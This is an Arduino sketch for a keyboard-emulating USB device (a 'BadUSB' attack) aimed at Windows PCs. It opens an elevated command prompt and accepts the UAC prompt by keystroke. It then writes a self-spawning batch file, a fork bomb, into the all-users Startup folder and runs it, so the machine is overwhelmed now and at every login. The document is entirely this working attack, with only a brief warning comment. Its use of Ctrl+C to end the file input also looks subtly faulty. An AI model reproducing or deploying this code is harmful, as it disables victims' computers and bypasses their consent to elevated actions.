// risk at your own. becareful with this code  
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{

  Keyboard.begin();

  delay(500);

  typeKey(KEY_LEFT_GUI);

  delay(200);

  Keyboard.print("CMD");

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_LEFT_ARROW);

  delay(200);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");

  typeKey(KEY_RETURN);

  Keyboard.print("copy con a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  Keyboard.print(":START");

  typeKey(KEY_RETURN);

  Keyboard.print("start a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("GOTO START");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("a.bat");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
